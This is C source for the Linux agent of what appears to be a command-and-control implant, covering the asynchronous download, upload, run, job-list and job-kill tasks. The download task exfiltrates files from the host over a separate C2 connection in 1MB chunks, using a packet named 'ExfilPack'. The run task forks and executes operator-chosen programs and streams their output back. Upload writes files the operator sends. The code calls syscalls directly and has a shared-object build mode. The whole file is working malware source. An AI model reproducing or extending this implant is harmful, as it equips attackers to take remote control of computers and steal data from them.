/// tasks_async.c -- Async commands for Linux agent (download/upload/run/job_list/job_kill)
/// Phase 3b: full implementation copied from macOS agent, adapted for Linux direct syscalls

#include "tasks_async.h"
#include "jobs.h"
#include "crt.h"
#include "crypt.h"
#include "types.h"

#ifdef BUILD_SO
#include "elf_resolve.h"
#else
#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif
#endif

// ── Helpers ──

static void write_error(mp_writer_t *w, const char *msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
}

// File open/close/read/write/stat abstraction
#ifdef BUILD_SO

#define F_open(p,f,m)    R_open(p,f,m)
#define F_close(fd)      R_close(fd)
#define F_read(fd,b,n)   R_read(fd,b,n)
#define F_write(fd,b,n)  R_write(fd,b,n)
#define F_fork()         R_fork()
#define F_setpgid(p,g)   R_setpgid(p,g)
#define F_execve(p,a,e)  R_execve(p,a,e)
#define F_dup2(o,n)      R_dup2(o,n)
#define F_pipe(p)        R_pipe(p)
#define F_fcntl(fd,c,a)  R_fcntl(fd,c,a)
#define F_waitpid(p,s,o) R_waitpid(p,s,o)
#define F_kill(p,s)      R_kill(p,s)
#define F_exit(s)        R_exit(s)
#define F_usleep(u)      R_usleep(u)

static int F_fstat_size(int fd) {
    struct { unsigned long st_dev; unsigned long st_ino; unsigned long st_nlink;
             unsigned int st_mode; unsigned int st_uid; unsigned int st_gid;
             unsigned int __pad; unsigned long st_rdev; long st_size;
             /* ... */ } st;
    if (R_fstat(fd, &st) != 0) return -1;
    return (int)st.st_size;
}

#else

#define F_open(p,f,m)    sys_open(p,f,m)
#define F_close(fd)      sys_close(fd)
#define F_read(fd,b,n)   sys_read(fd,b,n)
#define F_write(fd,b,n)  sys_write(fd,b,n)
#define F_fork()         sys_fork()
#define F_setpgid(p,g)   sys_setpgid(p,g)
#define F_execve(p,a,e)  sys_execve(p,a,e)
#define F_dup2(o,n)      sys_dup2(o,n)
#define F_pipe(p)        sys_pipe2(p,0)
#define F_fcntl(fd,c,a)  sys_fcntl(fd,c,a)
#define F_waitpid(p,s,o) sys_wait4(p,s,o,(void*)0)
#define F_kill(p,s)      sys_kill(p,s)
#define F_exit(s)        sys_exit_group(s)
#define F_usleep(u)      sys_usleep(u)

static int F_fstat_size(int fd) {
    struct linux_stat st;
    if (sys_fstat(fd, &st) != 0) return -1;
    return (int)st.st_size;
}

#endif

// O_* constants
#ifndef O_RDONLY
#define O_RDONLY   0
#define O_WRONLY   1
#define O_RDWR     2
#define O_CREAT    0100
#define O_TRUNC    01000
#define O_NONBLOCK 04000
#endif
#ifndef F_SETFL
#define F_SETFL    4
#define F_GETFL    3
#endif
#ifndef WNOHANG
#define WNOHANG    1
#endif

// ── Download ──
// Spawns thread -> opens new C2 connection -> streams file in 1MB chunks
// Wire: AnsDownload{id,path,size,content,start,finish,canceled}

#define DOWNLOAD_CHUNK_SIZE  (1024 * 1024)  // 1MB

typedef struct {
    int  job_idx;
    char task[64];
    char path[4096];
} download_args_t;

static void *download_thread(void *arg) {
    download_args_t *args = (download_args_t*)arg;
    job_context_t *ctx = &g_job_ctx;
    job_entry_t *job = &ctx->jobs[args->job_idx];

    // Open separate connection to C2
    if (jobs_open_connection(ctx, &job->conn) != 0) {
        job->active = 0;
        ax_free(args);
        return (void*)0;
    }

    // Send ExfilPack init: {id, type, task}
    mp_writer_t pack_w;
    mp_writer_init(&pack_w, 128);
    mp_write_map(&pack_w, 3);
    mp_write_kv_uint(&pack_w, "id", ctx->agent_id);
    mp_write_kv_uint(&pack_w, "type", ctx->profile_type);
    mp_write_kv_str(&pack_w, "task", args->task);

    if (jobs_send_init(ctx, &job->conn, EXFIL_PACK, pack_w.buf.data, (uint32_t)pack_w.buf.len) != 0) {
        mp_writer_free(&pack_w);
        conn_close(&job->conn);
        job->active = 0;
        ax_free(args);
        return (void*)0;
    }
    mp_writer_free(&pack_w);

    // Parse FileId from task hex string
    int file_id = ax_hextoi(args->task);

    // Open file
    int fd = F_open(args->path, O_RDONLY, 0);
    if (fd < 0) {
        // Send canceled message
        mp_writer_t ans_w;
        mp_writer_init(&ans_w, 128);
        mp_write_map(&ans_w, 7);
        mp_write_kv_int(&ans_w, "id", file_id);
        mp_write_kv_str(&ans_w, "path", args->path);
        mp_write_kv_int(&ans_w, "size", 0);
        mp_write_kv_bin(&ans_w, "content", (uint8_t*)0, 0);
        mp_write_kv_bool(&ans_w, "start", false);
        mp_write_kv_bool(&ans_w, "finish", true);
        mp_write_kv_bool(&ans_w, "canceled", true);

        jobs_send_message(ctx, &job->conn, COMMAND_DOWNLOAD, args->task,
                         ans_w.buf.data, (uint32_t)ans_w.buf.len);
        mp_writer_free(&ans_w);

        conn_close(&job->conn);
        jobs_remove(ctx, args->job_idx);
        ax_free(args);
        return (void*)0;
    }

    // Get file size
    int total_size = F_fstat_size(fd);
    if (total_size < 0) total_size = 0;

    // Read and stream in chunks
    uint8_t *chunk_buf = (uint8_t*)ax_malloc(DOWNLOAD_CHUNK_SIZE);
    int offset = 0;
    int first = 1;

    while (offset < total_size && !job->canceled) {
        int remaining = total_size - offset;
        int to_read = remaining < DOWNLOAD_CHUNK_SIZE ? remaining : DOWNLOAD_CHUNK_SIZE;

        long n = F_read(fd, chunk_buf, (size_t)to_read);
        if (n <= 0) break;

        int is_last = (offset + (int)n >= total_size);

        mp_writer_t ans_w;
        mp_writer_init(&ans_w, 128 + (size_t)n);
        mp_write_map(&ans_w, 7);
        mp_write_kv_int(&ans_w, "id", file_id);
        mp_write_kv_str(&ans_w, "path", args->path);
        mp_write_kv_int(&ans_w, "size", (int64_t)total_size);
        mp_write_kv_bin(&ans_w, "content", chunk_buf, (uint32_t)n);
        mp_write_kv_bool(&ans_w, "start", first ? true : false);
        mp_write_kv_bool(&ans_w, "finish", is_last ? true : false);
        mp_write_kv_bool(&ans_w, "canceled", false);

        if (jobs_send_message(ctx, &job->conn, COMMAND_DOWNLOAD, args->task,
                             ans_w.buf.data, (uint32_t)ans_w.buf.len) != 0) {
            mp_writer_free(&ans_w);
            break;
        }
        mp_writer_free(&ans_w);

        offset += (int)n;
        first = 0;
    }

    // If canceled, send cancel marker
    if (job->canceled && offset < total_size) {
        mp_writer_t ans_w;
        mp_writer_init(&ans_w, 128);
        mp_write_map(&ans_w, 7);
        mp_write_kv_int(&ans_w, "id", file_id);
        mp_write_kv_str(&ans_w, "path", args->path);
        mp_write_kv_int(&ans_w, "size", (int64_t)total_size);
        mp_write_kv_bin(&ans_w, "content", (uint8_t*)0, 0);
        mp_write_kv_bool(&ans_w, "start", false);
        mp_write_kv_bool(&ans_w, "finish", true);
        mp_write_kv_bool(&ans_w, "canceled", true);

        jobs_send_message(ctx, &job->conn, COMMAND_DOWNLOAD, args->task,
                         ans_w.buf.data, (uint32_t)ans_w.buf.len);
        mp_writer_free(&ans_w);
    }

    ax_free(chunk_buf);
    F_close(fd);
    conn_close(&job->conn);
    jobs_remove(ctx, args->job_idx);
    ax_free(args);
    return (void*)0;
}

int task_download(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    // Parse ParamsDownload{Task, Path}
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) { write_error(w, "bad params"); return 0; }

    char task[64] = {0};
    char path[4096] = {0};

    for (uint32_t i = 0; i < mc; i++) {
        const char *k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        if (kl == 4 && ax_memcmp(k, "task", 4) == 0) {
            const char *v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(task)) { ax_memcpy(task, v, vl); task[vl] = '\0'; }
        } else if (kl == 4 && ax_memcmp(k, "path", 4) == 0) {
            const char *v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(path)) { ax_memcpy(path, v, vl); path[vl] = '\0'; }
        } else {
            mp_skip(&r);
        }
    }

    if (task[0] == '\0' || path[0] == '\0') {
        write_error(w, "missing task or path");
        return 0;
    }

    int idx = jobs_alloc(&g_job_ctx);
    if (idx < 0) { write_error(w, "max jobs reached"); return 0; }

    job_entry_t *job = &g_job_ctx.jobs[idx];
    ax_strncpy(job->job_id, task, sizeof(job->job_id) - 1);
    job->job_type = JOB_TYPE_DOWNLOAD;
    job->active = 1;

    download_args_t *args = (download_args_t*)ax_malloc(sizeof(download_args_t));
    args->job_idx = idx;
    ax_strncpy(args->task, task, sizeof(args->task) - 1);
    ax_strncpy(args->path, path, sizeof(args->path) - 1);

    jobs_thread_create(&job->thread, download_thread, args);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "download started");
    return 0;
}

// ── Upload ──
// Synchronous — data received in chunks via normal command loop
// Wire: ParamsUpload{Path, Content, Finish}

int task_upload(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) { write_error(w, "bad params"); return 0; }

    char task[64] = {0};
    char path[4096] = {0};
    const uint8_t *content = (uint8_t*)0;
    uint32_t content_len = 0;
    bool finish = false;

    for (uint32_t i = 0; i < mc; i++) {
        const char *k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        if (kl == 4 && ax_memcmp(k, "task", 4) == 0) {
            const char *v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(task)) { ax_memcpy(task, v, vl); task[vl] = '\0'; }
        } else if (kl == 4 && ax_memcmp(k, "path", 4) == 0) {
            const char *v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(path)) { ax_memcpy(path, v, vl); path[vl] = '\0'; }
        } else if (kl == 7 && ax_memcmp(k, "content", 7) == 0) {
            mp_read_bin(&r, &content, &content_len);
        } else if (kl == 6 && ax_memcmp(k, "finish", 6) == 0) {
            mp_read_bool(&r, &finish);
        } else {
            mp_skip(&r);
        }
    }

    if (task[0] == '\0') { write_error(w, "missing task"); return 0; }

    job_context_t *ctx = &g_job_ctx;

    // Find or create upload entry
    int uidx = -1;
    for (int i = 0; i < ctx->upload_count; i++) {
        if (ax_strcmp(ctx->uploads[i].task_id, task) == 0) { uidx = i; break; }
    }
    if (uidx < 0) {
        if (ctx->upload_count >= MAX_JOBS) { write_error(w, "max uploads reached"); return 0; }
        uidx = ctx->upload_count++;
        ax_memset(&ctx->uploads[uidx], 0, sizeof(upload_entry_t));
        ax_strncpy(ctx->uploads[uidx].task_id, task, sizeof(ctx->uploads[uidx].task_id) - 1);
    }

    upload_entry_t *up = &ctx->uploads[uidx];

    // Append content
    if (content && content_len > 0) {
        size_t needed = up->data_len + content_len;
        if (needed > up->data_cap) {
            size_t new_cap = needed * 2;
            if (new_cap < 4096) new_cap = 4096;
            uint8_t *new_data = (uint8_t*)ax_malloc(new_cap);
            if (up->data && up->data_len > 0) {
                ax_memcpy(new_data, up->data, up->data_len);
                ax_free(up->data);
            }
            up->data = new_data;
            up->data_cap = new_cap;
        }
        ax_memcpy(up->data + up->data_len, content, content_len);
        up->data_len += content_len;
    }

    if (finish) {
        // Write file
        int fd = F_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd < 0) {
            write_error(w, "failed to create file");
        } else {
            if (up->data && up->data_len > 0) {
                F_write(fd, up->data, up->data_len);
            }
            F_close(fd);

            mp_write_map(w, 2);
            mp_write_kv_str(w, "path", path);
            mp_write_kv_int(w, "size", (int64_t)up->data_len);
        }

        // Cleanup upload entry
        if (up->data) ax_free(up->data);
        for (int i = uidx; i < ctx->upload_count - 1; i++)
            ctx->uploads[i] = ctx->uploads[i + 1];
        ctx->upload_count--;
    } else {
        mp_write_map(w, 1);
        mp_write_kv_str(w, "status", "chunk received");
    }

    return 0;
}

// ── Run ──
// Spawns thread -> opens new C2 connection -> fork+execve -> streams stdout/stderr
// Wire: AnsRun{Stdout, Stderr, Pid, Start, Finish}

#define RUN_CHUNK_SIZE  65536  // 64KB

typedef struct {
    int   job_idx;
    char  task[64];
    char  program[4096];
    char *args[64];
    int   argc;
} run_args_t;

static void *run_thread(void *arg) {
    run_args_t *rargs = (run_args_t*)arg;
    job_context_t *ctx = &g_job_ctx;
    job_entry_t *job = &ctx->jobs[rargs->job_idx];

    // Open separate connection to C2
    if (jobs_open_connection(ctx, &job->conn) != 0) {
        job->active = 0;
        for (int i = 0; i < rargs->argc; i++) ax_free(rargs->args[i]);
        ax_free(rargs);
        return (void*)0;
    }

    // Send JobPack init: {id, type, task}
    mp_writer_t pack_w;
    mp_writer_init(&pack_w, 128);
    mp_write_map(&pack_w, 3);
    mp_write_kv_uint(&pack_w, "id", ctx->agent_id);
    mp_write_kv_uint(&pack_w, "type", ctx->profile_type);
    mp_write_kv_str(&pack_w, "task", rargs->task);

    if (jobs_send_init(ctx, &job->conn, JOB_PACK, pack_w.buf.data, (uint32_t)pack_w.buf.len) != 0) {
        mp_writer_free(&pack_w);
        conn_close(&job->conn);
        job->active = 0;
        for (int i = 0; i < rargs->argc; i++) ax_free(rargs->args[i]);
        ax_free(rargs);
        return (void*)0;
    }
    mp_writer_free(&pack_w);

    // Create pipes for stdout and stderr
    int stdout_pipe[2], stderr_pipe[2];
    if (F_pipe(stdout_pipe) != 0 || F_pipe(stderr_pipe) != 0) {
        conn_close(&job->conn);
        jobs_remove(ctx, rargs->job_idx);
        for (int i = 0; i < rargs->argc; i++) ax_free(rargs->args[i]);
        ax_free(rargs);
        return (void*)0;
    }

    // Build argv
    char *exec_argv[66];
    exec_argv[0] = rargs->program;
    for (int i = 0; i < rargs->argc && i < 63; i++)
        exec_argv[i + 1] = rargs->args[i];
    exec_argv[rargs->argc + 1] = (char*)0;

    int pid = F_fork();
    if (pid < 0) {
        F_close(stdout_pipe[0]); F_close(stdout_pipe[1]);
        F_close(stderr_pipe[0]); F_close(stderr_pipe[1]);
        conn_close(&job->conn);
        jobs_remove(ctx, rargs->job_idx);
        for (int i = 0; i < rargs->argc; i++) ax_free(rargs->args[i]);
        ax_free(rargs);
        return (void*)0;
    }

    if (pid == 0) {
        // Child process
        F_setpgid(0, 0);
        F_close(stdout_pipe[0]);
        F_close(stderr_pipe[0]);
        F_dup2(stdout_pipe[1], 1);
        F_dup2(stderr_pipe[1], 2);
        F_close(stdout_pipe[1]);
        F_close(stderr_pipe[1]);

        // Get environ from /proc/self/environ is complex, pass NULL
        // On Linux, execve with NULL envp gives empty env
        // Actually use the existing environment pointer (stack)
        F_execve(rargs->program, exec_argv, (char*const*)0);
        F_exit(1);
    }

    // Parent: close write ends
    F_close(stdout_pipe[1]);
    F_close(stderr_pipe[1]);

    // Set reads to non-blocking
    F_fcntl(stdout_pipe[0], F_SETFL, O_NONBLOCK);
    F_fcntl(stderr_pipe[0], F_SETFL, O_NONBLOCK);

    // Send start message
    {
        mp_writer_t ans_w;
        mp_writer_init(&ans_w, 128);
        mp_write_map(&ans_w, 5);
        mp_write_kv_str(&ans_w, "stdout", "");
        mp_write_kv_str(&ans_w, "stderr", "");
        mp_write_kv_int(&ans_w, "pid", pid);
        mp_write_kv_bool(&ans_w, "start", true);
        mp_write_kv_bool(&ans_w, "finish", false);

        jobs_send_message(ctx, &job->conn, COMMAND_RUN, rargs->task,
                         ans_w.buf.data, (uint32_t)ans_w.buf.len);
        mp_writer_free(&ans_w);
    }

    // Streaming loop
    uint8_t *out_buf = (uint8_t*)ax_malloc(RUN_CHUNK_SIZE);
    uint8_t *err_buf = (uint8_t*)ax_malloc(RUN_CHUNK_SIZE);
    int process_done = 0;

    while (!process_done && !job->canceled) {
        F_usleep(1000000);  // 1 second

        long out_n = F_read(stdout_pipe[0], out_buf, RUN_CHUNK_SIZE);
        if (out_n < 0) out_n = 0;

        long err_n = F_read(stderr_pipe[0], err_buf, RUN_CHUNK_SIZE);
        if (err_n < 0) err_n = 0;

        int status;
        int wret = F_waitpid(pid, &status, WNOHANG);
        if (wret > 0) process_done = 1;

        if (out_n > 0 || err_n > 0) {
            char *out_str = (char*)ax_malloc((size_t)out_n + 1);
            ax_memcpy(out_str, out_buf, (size_t)out_n);
            out_str[out_n] = '\0';

            char *err_str = (char*)ax_malloc((size_t)err_n + 1);
            ax_memcpy(err_str, err_buf, (size_t)err_n);
            err_str[err_n] = '\0';

            mp_writer_t ans_w;
            mp_writer_init(&ans_w, 128 + (size_t)out_n + (size_t)err_n);
            mp_write_map(&ans_w, 5);
            mp_write_str(&ans_w, "stdout", 6);
            mp_write_str(&ans_w, out_str, (uint32_t)out_n);
            mp_write_str(&ans_w, "stderr", 6);
            mp_write_str(&ans_w, err_str, (uint32_t)err_n);
            mp_write_kv_int(&ans_w, "pid", pid);
            mp_write_kv_bool(&ans_w, "start", false);
            mp_write_kv_bool(&ans_w, "finish", false);

            jobs_send_message(ctx, &job->conn, COMMAND_RUN, rargs->task,
                             ans_w.buf.data, (uint32_t)ans_w.buf.len);
            mp_writer_free(&ans_w);
            ax_free(out_str);
            ax_free(err_str);
        }
    }

    // If canceled, kill process group
    if (job->canceled) {
        F_kill(-pid, 9);  // kill process group
        F_waitpid(pid, (void*)0, 0);
    }

    // Drain remaining output
    for (;;) {
        long out_n = F_read(stdout_pipe[0], out_buf, RUN_CHUNK_SIZE);
        long err_n = F_read(stderr_pipe[0], err_buf, RUN_CHUNK_SIZE);
        if (out_n <= 0 && err_n <= 0) break;
        if (out_n < 0) out_n = 0;
        if (err_n < 0) err_n = 0;

        char *out_str = (char*)ax_malloc((size_t)out_n + 1);
        ax_memcpy(out_str, out_buf, (size_t)out_n);
        out_str[out_n] = '\0';

        char *err_str = (char*)ax_malloc((size_t)err_n + 1);
        ax_memcpy(err_str, err_buf, (size_t)err_n);
        err_str[err_n] = '\0';

        mp_writer_t ans_w;
        mp_writer_init(&ans_w, 128 + (size_t)out_n + (size_t)err_n);
        mp_write_map(&ans_w, 5);
        mp_write_str(&ans_w, "stdout", 6);
        mp_write_str(&ans_w, out_str, (uint32_t)out_n);
        mp_write_str(&ans_w, "stderr", 6);
        mp_write_str(&ans_w, err_str, (uint32_t)err_n);
        mp_write_kv_int(&ans_w, "pid", pid);
        mp_write_kv_bool(&ans_w, "start", false);
        mp_write_kv_bool(&ans_w, "finish", false);

        jobs_send_message(ctx, &job->conn, COMMAND_RUN, rargs->task,
                         ans_w.buf.data, (uint32_t)ans_w.buf.len);
        mp_writer_free(&ans_w);
        ax_free(out_str);
        ax_free(err_str);
    }

    // Send finish message
    {
        mp_writer_t ans_w;
        mp_writer_init(&ans_w, 128);
        mp_write_map(&ans_w, 5);
        mp_write_kv_str(&ans_w, "stdout", "");
        mp_write_kv_str(&ans_w, "stderr", "");
        mp_write_kv_int(&ans_w, "pid", pid);
        mp_write_kv_bool(&ans_w, "start", false);
        mp_write_kv_bool(&ans_w, "finish", true);

        jobs_send_message(ctx, &job->conn, COMMAND_RUN, rargs->task,
                         ans_w.buf.data, (uint32_t)ans_w.buf.len);
        mp_writer_free(&ans_w);
    }

    F_close(stdout_pipe[0]);
    F_close(stderr_pipe[0]);
    ax_free(out_buf);
    ax_free(err_buf);
    conn_close(&job->conn);
    jobs_remove(ctx, rargs->job_idx);

    for (int i = 0; i < rargs->argc; i++) ax_free(rargs->args[i]);
    ax_free(rargs);
    return (void*)0;
}

int task_run(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) { write_error(w, "bad params"); return 0; }

    char task[64] = {0};
    char program[4096] = {0};
    char *args[64];
    int argc = 0;

    for (uint32_t i = 0; i < mc; i++) {
        const char *k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        if (kl == 4 && ax_memcmp(k, "task", 4) == 0) {
            const char *v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(task)) { ax_memcpy(task, v, vl); task[vl] = '\0'; }
        } else if (kl == 7 && ax_memcmp(k, "program", 7) == 0) {
            const char *v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(program)) { ax_memcpy(program, v, vl); program[vl] = '\0'; }
        } else if (kl == 4 && ax_memcmp(k, "args", 4) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) == 0) {
                for (uint32_t j = 0; j < arr_count && argc < 63; j++) {
                    const char *v; uint32_t vl;
                    if (mp_read_str(&r, &v, &vl) == 0) {
                        args[argc] = (char*)ax_malloc(vl + 1);
                        ax_memcpy(args[argc], v, vl);
                        args[argc][vl] = '\0';
                        argc++;
                    }
                }
            }
        } else {
            mp_skip(&r);
        }
    }

    if (task[0] == '\0' || program[0] == '\0') {
        for (int i = 0; i < argc; i++) ax_free(args[i]);
        write_error(w, "missing task or program");
        return 0;
    }

    int idx = jobs_alloc(&g_job_ctx);
    if (idx < 0) {
        for (int i = 0; i < argc; i++) ax_free(args[i]);
        write_error(w, "max jobs reached");
        return 0;
    }

    job_entry_t *job = &g_job_ctx.jobs[idx];
    ax_strncpy(job->job_id, task, sizeof(job->job_id) - 1);
    job->job_type = JOB_TYPE_RUN;
    job->active = 1;

    run_args_t *rargs = (run_args_t*)ax_malloc(sizeof(run_args_t));
    ax_memset(rargs, 0, sizeof(run_args_t));
    rargs->job_idx = idx;
    ax_strncpy(rargs->task, task, sizeof(rargs->task) - 1);
    ax_strncpy(rargs->program, program, sizeof(rargs->program) - 1);
    rargs->argc = argc;
    for (int i = 0; i < argc; i++)
        rargs->args[i] = args[i];  // Transfer ownership

    jobs_thread_create(&job->thread, run_thread, rargs);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "run started");
    return 0;
}

// ── Job List ──

int task_job_list(mp_writer_t *w) {
    job_context_t *ctx = &g_job_ctx;

    int count = 0;
    jobs_mutex_lock(&ctx->jobs_mutex);
    for (int i = 0; i < MAX_JOBS; i++) {
        if (ctx->jobs[i].active) count++;
    }

    mp_write_map(w, 1);
    mp_write_str(w, "jobs", 4);
    mp_write_array(w, (uint32_t)count);

    for (int i = 0; i < MAX_JOBS; i++) {
        if (ctx->jobs[i].active) {
            mp_write_map(w, 2);
            mp_write_kv_str(w, "job_id", ctx->jobs[i].job_id);
            mp_write_kv_int(w, "job_type", ctx->jobs[i].job_type);
        }
    }
    jobs_mutex_unlock(&ctx->jobs_mutex);

    return 0;
}

// ── Job Kill ──

int task_job_kill(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    const char *id = (const char*)0;
    uint32_t id_len = 0;

    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) { write_error(w, "bad params"); return 0; }

    for (uint32_t i = 0; i < mc; i++) {
        const char *k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        if (kl == 2 && ax_memcmp(k, "id", 2) == 0) {
            mp_read_str(&r, &id, &id_len);
        } else {
            mp_skip(&r);
        }
    }

    if (!id || id_len == 0) { write_error(w, "missing id"); return 0; }

    char id_str[64] = {0};
    if (id_len >= sizeof(id_str)) id_len = sizeof(id_str) - 1;
    ax_memcpy(id_str, id, id_len);

    job_context_t *ctx = &g_job_ctx;

    // Search in jobs (downloads + runs)
    int idx = jobs_find(ctx, id_str);
    if (idx >= 0) {
        ctx->jobs[idx].canceled = 1;
        mp_write_map(w, 1);
        mp_write_kv_str(w, "status", "job canceled");
        return 0;
    }

    // Search in tunnels (MUX model: mark as closed, process_tunnels handles cleanup)
    int ch_id = ax_atoi(id_str);
    int tidx = tunnels_find(ctx, ch_id);
    if (tidx >= 0) {
        ctx->tunnels[tidx].state = TUNNEL_STATE_CLOSED;
        mp_write_map(w, 1);
        mp_write_kv_str(w, "status", "tunnel canceled");
        return 0;
    }

    // Search in terminals
    int term_idx = terminals_find(ctx, ch_id);
    if (term_idx >= 0) {
        ctx->terminals[term_idx].canceled = 1;
        mp_write_map(w, 1);
        mp_write_kv_str(w, "status", "terminal canceled");
        return 0;
    }

    write_error(w, "job not found");
    return 0;
}
